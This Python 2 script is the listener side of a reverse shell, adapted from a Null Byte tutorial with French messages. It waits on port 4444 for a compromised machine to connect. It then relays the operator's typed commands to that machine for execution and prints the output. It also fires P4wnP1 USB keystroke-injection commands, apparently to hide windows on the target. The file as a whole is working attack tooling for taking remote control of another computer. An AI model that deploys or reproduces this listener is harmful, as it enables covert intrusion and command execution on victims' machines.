# nullbyte python server reverse shell
# source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
# Modify by BeBoX 22.01.2019 auto add shell in cmd, corrected some errors
# Set in FR language
import socket, os, sys, time, subprocess
hidcmd = "P4wnP1_cli hid run minimize.js"
def shell(cmd):
    return(subprocess.check_output(cmd, shell = True ))
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = 4444
    except socket.error as msg:
        print('erreur de creation du socket: ' + str(msg[0]))
def socketBind():
    try:
        print('En attente du socket sur port %s'%(port))
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print('socket binding error: ' + str(msg[0]))
        print('Nouvelle tentative ...')
        time.sleep(500)
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print('[!] Session ouverte a %s:%s'%(addr[0],addr[1]))
        print('\n')
        print('Attente du client\nTapez \'quit\' pour sortir')
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print('Ereur acceptation du socket: ' + str(msg[0]))
def menu():
    shell("P4wnP1_cli hid run -c \"press('GUI DOWN')\"")
    while 1:
        cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        else:
            cmd = 'shell '+ cmd #add automaticaly shell before commands if not quit
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result <> hostname:
            print(result)
def main():
    socketCreate()
    socketBind()
    socketAccept()
    
main()